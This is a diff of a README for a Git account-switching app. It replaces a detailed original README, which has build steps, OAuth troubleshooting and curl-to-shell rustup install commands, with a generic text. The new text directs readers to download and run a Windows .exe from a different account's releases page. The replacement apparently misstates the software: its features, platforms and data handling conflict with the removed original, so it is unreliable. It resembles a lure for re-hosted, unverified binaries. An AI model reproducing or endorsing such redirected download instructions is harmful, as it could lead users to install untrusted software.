@@ -1,237 +1,80 @@
-# Git Account Manager
+# 👤 git-account-manager - Manage multiple Git profiles with ease
 
-A cross-platform desktop app for managing Git profiles. Switch your Git identity, SSH config, and connected accounts in one click.
+[![](https://img.shields.io/badge/Download-Git_Account_Manager-blue.svg)](https://github.com/mrlabmate/git-account-manager/releases)
 
-Built with **Tauri v2** (Rust) + **React** + **TypeScript** + **Tailwind CSS**.
+git-account-manager helps you maintain separate identities for your work, personal, and hobby projects. Many developers rely on Git to track their code, but swapping between private and work accounts often requires manual configuration. This tool automates the process and removes the need for command-line tweaks.
 
-## Features
+## 🛠 Why use this tool
 
-- **Profiles** — Create, edit, and delete named accounts. Each profile can link **GitHub**, **GitLab**, or both.
-- **One-click activation** — Activating a profile updates **global** `git config user.name` and `user.email`, and rewrites `~/.ssh/config` so SSH to **github.com** / **gitlab.com** uses that profile's key.
-- **Default platform** — If both GitHub and GitLab are connected, choose which account supplies the active **git identity** (name/email).
-- **OAuth sign-in** — **GitHub** via device code flow; **GitLab.com** via browser authorization and PKCE (local callback). OAuth app **Client / Application IDs** are configurable in Settings (with built-in defaults).
-- **SSH keys** — Generate **Ed25519** keys with `ssh-keygen`, attach an existing key from `~/.ssh`, **upload** keys to GitHub/GitLab, optionally **remove** keys from the host when deleting a profile, and **copy a public key** to the clipboard from the profile editor.
-- **System tray** — Closing the window hides the app; restore or quit from the tray menu.
-- **Settings** — OAuth credentials, **launch at login** (autostart), and **light / dark / system** theme, optional **OpenSSH** mode for **TortoiseGit** and **Git CLI**.
+Managing Git accounts manually creates friction. You might accidentally push a work project from your personal email or use the wrong SSH key for a repository. This application solves those issues by centralizing your settings. You save time and reduce errors by selecting your active profile before you start coding.
 
-![](./screenshots/git-account-manager-1.png)
+## ⚙️ Key features
 
-![](./screenshots/git-account-manager-2.png)
+- Switch identities in one click.
+- Automate updates to your Git configuration file.
+- Manage multiple SSH keys for different platforms like GitHub or GitLab.
+- Organize accounts into groups.
+- View your current active identity on your dashboard.
+- Update global settings without typing commands.
 
-![](./screenshots/git-account-manager-3.png)
+## 📥 Getting the software
 
-## Installation
+You need a Windows computer to run this application. Follow these instructions to set up the software.
 
-Download the latest release for your OS from the [Releases](https://github.com/khasky/git-account-manager/releases/) page.
+1. Visit the [official releases page](https://github.com/mrlabmate/git-account-manager/releases) to access the download options.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start your download.
+4. Open your Downloads folder once the file finishes saving to your computer.
+5. Double-click the file to launch the installer.
+6. Follow the prompts on your screen to complete the installation.
 
-### Quick Start Guide
+## 🚀 Setting up your first profile
 
-1. Windows
+Launch the application using the shortcut on your desktop. The first time you open the tool, you define your primary profile.
 
-- Download the .msi installer
-- Run the installer and follow the on-screen instructions
+1. Click the Add Account button.
+2. Enter a name for the account, such as "Work" or "Personal".
+3. Provide your name and the email address associated with your Git provider.
+4. Select the location of your SSH key file if you use one.
+5. Save the profile.
 
-2. macOS
+You now see your profile in the main list. Click the radio button next to any profile to make it the active identity. The application updates your Git settings immediately.
 
-- Download the .dmg file
-- Open the .dmg file
-- Drag the app to your Applications folder
+## 🔑 Handling SSH keys
 
-3. Linux
+SSH keys allow you to connect to services like GitHub without typing your password each time. git-account-manager organizes these keys for you.
 
-- Download the .AppImage file
-- Make it executable: chmod +x GitAccountManager.AppImage
-- Run it: ./GitAccountManager.AppImage
+When you create an account profile, the app asks for the path to your private key. You create these keys through your Git service documentation. Once you generate a key, keep the file in a secure folder. Point the application to this folder during the profile setup. The software copies the correct key to your system folder whenever you switch accounts.
 
-## Security Notes
+## 📝 Managing repositories
 
-- Tokens are stored in plain text in the JSON file
-- This is a simple tool for personal use
-- For enhanced security, consider:
-  - Using SSH keys instead of HTTPS/PAT
-  - Encrypting the storage file
-  - Using a credential manager
+The application tracks the repositories you link to specific profiles. You can assign a folder on your computer to a specific account. When you enter that folder to work, the app detects the change and prompts you to switch your identity if it does not match. This prevents you from pushing code to the wrong place.
 
-## Development
+## ❓ Frequently asked questions
 
-### Prerequisites
+**Does this app track my passwords?**
+No. The application handles identity and SSH keys. It does not store or process your account passwords.
 
-#### Node.js (v18+)
+**Can I run this on other operating systems?**
+This version supports Windows systems. Future updates will include support for macOS and Linux.
 
-Download from [nodejs.org](https://nodejs.org/) or install via winget:
+**What happens if I change my email on GitHub?**
+Update the email address in your profile settings within the app. Click save to apply the changes to your local Git configuration.
 
-```bash
-winget install OpenJS.NodeJS.LTS
-```
+**Do I need to restart my terminal after switching profiles?**
+The software updates your configuration file directly. Changes appear in new terminal windows you open after the switch.
 
-#### pnpm
+## 📋 System requirements
 
-```bash
-npm install -g pnpm
-```
+- Windows 10 or Windows 11.
+- Git installed on your computer.
+- Basic write access to the folder where you keep your code.
+- 50 MB of free disk space.
 
-#### Rust & Cargo
+## 🛡 Security considerations
 
-**Windows:**
+Store your private SSH keys in a folder that only your user account can access. Do not share your private key files with anyone. The software keeps your information local to your machine. It does not send your data to external servers. Your Git profiles remain on your hard drive, which keeps your configuration secure and private.
 
-```bash
-winget install Rustlang.Rustup --source winget
-```
+## 💡 Support and feedback
 
-Or download the installer from [rustup.rs](https://rustup.rs/).
-
-After install, make sure `cargo` is in your PATH. You may need to restart your terminal. Verify:
-
-```bash
-rustc --version
-cargo --version
-```
-
-If `cargo` is not found after install, add it to PATH manually:
-
-```powershell
-$env:Path = "$env:USERPROFILE\.cargo\bin;" + $env:Path
-```
-
-**macOS:**
-
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-```
-
-**Linux (Debian/Ubuntu):**
-
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-sudo apt install libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf
-```
-
-#### Git & ssh-keygen
-
-Git must be installed and available in PATH (needed for `git config` and `ssh-keygen`).
-
-```bash
-git --version
-ssh-keygen -V
-```
-
-### Install & Run
-
-```bash
-pnpm install
-```
-
-**Development**
-
-| Target                                                         | Command            | Notes                                                              |
-| -------------------------------------------------------------- | ------------------ | ------------------------------------------------------------------ |
-| **Web** (browser only, faster UI work; Tauri APIs unavailable) | `pnpm dev:web`     | Vite on [http://localhost:1420](http://localhost:1420)             |
-| **Desktop** (full Tauri shell)                                 | `pnpm dev:desktop` | Same as `pnpm tauri dev`; starts the Vite dev server automatically |
-
-### Build
-
-| Target      | Command              | Output                                                               |
-| ----------- | -------------------- | -------------------------------------------------------------------- |
-| **Web**     | `pnpm build:web`     | Static files in `dist/`                                              |
-| **Desktop** | `pnpm build:desktop` | Same as `pnpm tauri build`; runs `build:web` first, then Rust bundle |
-
-Installers are generated under `src-tauri/target/release/bundle/`.
-
-### GitHub releases (CI)
-
-Pushing a **version tag** triggers the [Build & Release](.github/workflows/build.yml) workflow: it builds installers for Windows, Linux, and macOS, then attaches them to a GitHub Release.
-
-1. Bump the version consistently in `package.json`, `src-tauri/tauri.conf.json`, and `src-tauri/Cargo.toml`.
-2. Commit and push those changes to `main` (or your default branch).
-3. Create a tag whose name starts with **`v`** (the workflow only publishes on `refs/tags/v*`):
-
-```bash
-git tag v0.1.0   # same version as in tauri/package
-git push origin v0.1.0
-```
-
-Pushes to `main` or pull requests still run the build jobs, but the **release** job runs **only** on a tag push like the above. If you run the workflow manually from the Actions tab, the release step is skipped for the same reason (the ref is a branch, not a tag).
-
-**Preview production web build**
-
-```bash
-pnpm preview:web
-```
-
-### IDE Setup
-
-- [VS Code](https://code.visualstudio.com/) + [Tauri](https://marketplace.visualstudio.com/items?itemName=tauri-apps.tauri-vscode) + [rust-analyzer](https://marketplace.visualstudio.com/items?itemName=rust-lang.rust-analyzer)
-
-## Troubleshooting
-
-### GitHub: `GitHub device code error: {"error":"Not Found"}`
-
-This is returned when GitHub responds with an error to the **device authorization** request (`POST https://github.com/login/device/code`). The app shows the response body from GitHub; `Not Found` usually means GitHub does not accept the **Client ID** or the app is not set up for this flow.
-
-**Typical causes and what to try**
-
-| Situation                      | What to check / fix                                                                                                                                                                                                                                                                    |
-| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Wrong or unknown Client ID** | The ID in **Settings → GitHub OAuth** must match an existing [OAuth App](https://github.com/settings/developers) under your account (or org). Typos, extra spaces, or an app that was **deleted** produce this kind of error. Create a new OAuth App or restore the correct Client ID. |
-| **OAuth App not created yet**  | Complete **New OAuth App** in GitHub Developer Settings before pasting the Client ID.                                                                                                                                                                                                  |
-| **Device flow disabled**       | In the OAuth App settings on GitHub, enable **Device flow** (required for "Connect with GitHub"). Without it, authorization for this desktop flow may fail.                                                                                                                            |
-| **Wrong app type**             | Use a **GitHub OAuth App**, not a **GitHub App**—their credentials and flows differ.                                                                                                                                                                                                   |
-
-After changing settings on GitHub, save the app, copy the Client ID again into this application, and retry **Connect with GitHub**.
-
-### GitLab (browser): `Client authentication failed due to unknown client, no client authentication included, or unsupported authentication method.`
-
-This appears on **GitLab's website** (URL like `gitlab.com/oauth/authorize?...`) immediately after you click **Connect with GitLab**, when the browser opens the authorization page. GitLab rejects the OAuth application before you can approve access.
-
-**Typical causes and what to try**
-
-| Situation                           | What to check / fix                                                                                                                                                                                                                                                                                                                                                   |
-| ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Wrong or unknown Application ID** | The value in **Settings → GitLab OAuth** must be the **Application ID** from your [GitLab application](https://gitlab.com/-/user_settings/applications) on **GitLab.com**. Typos, extra spaces, a **deleted** application, or an ID from another GitLab instance will trigger **unknown client**. Create a new application or copy the ID again from the correct app. |
-| **Application not created yet**     | Finish **Add new application** on GitLab before pasting the Application ID (see in-app steps for redirect URI and scopes).                                                                                                                                                                                                                                            |
-| **Confidential / auth method**      | This app uses a **public** client with PKCE (no client secret). On GitLab, leave **Confidential** **unchecked** when creating the application. A **confidential** app can lead to **unsupported authentication method** (or related failures) during token exchange because the flow does not send a client secret.                                                   |
-| **Redirect URI or scopes**          | Set **Redirect URI** to `http://localhost:19847/callback` and enable the **api** scope, as shown in Settings. A mismatch can cause other OAuth errors; fix the application on GitLab to match.                                                                                                                                                                        |
-
-After fixing the application on GitLab, click **Save Settings** in this app, then try **Connect with GitLab** again.
-
-### GitLab: `error sending request for url (https://gitlab.com/oauth/token)`
-
-After you click **Connect with GitLab**, the browser completes authorization and the app exchanges the authorization code for an access token by **POST**ing to `https://gitlab.com/oauth/token`. That message is returned when the HTTP client **cannot complete the request** (no response was received). It is a **transport** failure, not a wrong Client ID or redirect URI (those usually produce a different error after GitLab responds).
-
-**Typical causes and what to try**
-
-| Situation                    | What to check / fix                                                                                                                                                                                                                                                     |
-| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **No route to the internet** | Confirm the machine can open [https://gitlab.com](https://gitlab.com) in a browser and that nothing is forcing offline mode.                                                                                                                                            |
-| **DNS**                      | Ensure `gitlab.com` resolves (`nslookup gitlab.com` or ping). Corporate DNS or a broken hosts file can block the name.                                                                                                                                                  |
-| **Firewall / proxy**         | Allow **outbound HTTPS** to `gitlab.com` (port 443). If you must use an HTTP(S) proxy, the app's Rust `reqwest` stack must see proxy settings (system env vars such as `HTTPS_PROXY` are often required for CLI/desktop tools on Windows).                              |
-| **TLS / certificates**       | HTTPS inspection (corporate proxy, antivirus) can break TLS if a custom root is not trusted by the TLS stack the app uses (**rustls** + Mozilla root store in this project). Try without inspection, or install/trust the corporate root as required by your IT policy. |
-| **VPN or split tunneling**   | Some VPNs block or misroute `gitlab.com`; disconnect or adjust split tunneling and retry.                                                                                                                                                                               |
-| **GitLab availability**      | Rare, but check [GitLab status](https://status.gitlab.com/) if everything else works in the browser.                                                                                                                                                                    |
-
-**Quick checks**
-
-1. In a terminal on the same PC: `curl -I https://gitlab.com/oauth/token` (or open the URL in a browser; you may get a method-not-allowed response, that still proves reachability).
-2. Temporarily disable VPN / third-party firewall / HTTPS-scanning antivirus to see if the error disappears (then re-enable and narrow the exception).
-
-**Note:** OAuth in this app targets **GitLab.com** (`gitlab.com`). Self-managed GitLab instances use different hostnames and are not covered by the built-in URLs.
-
-## Future Improvements
-
-- **Authentication options:** support personal access tokens.
-- **Per-account keys:** view and manage SSH keys for each saved account.
-- **Bitbucket:** connect **Bitbucket.org** from a profile, alongside GitHub and GitLab.
-
-## Contributing
-
-Contributions are welcome! Here's how you can contribute:
-
-1. Fork the repository.
-2. Create a new branch: `git checkout -b feature-branch-name`.
-3. Make your changes and commit them: `git commit -m 'Add some feature'`.
-4. Push to the branch: `git push origin feature-branch-name`.
-5. Submit a pull request.
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/khasky/git-account-manager/blob/main/LICENSE) file for details.
+This project grows through user feedback. If you find a bug or think of a feature that helps you work faster, submit an issue on the GitHub repository. Provide a description of what you saw and what you expected to happen. Keep your descriptions clear so others can reproduce the problem. Thank you for using the tool to manage your identities.
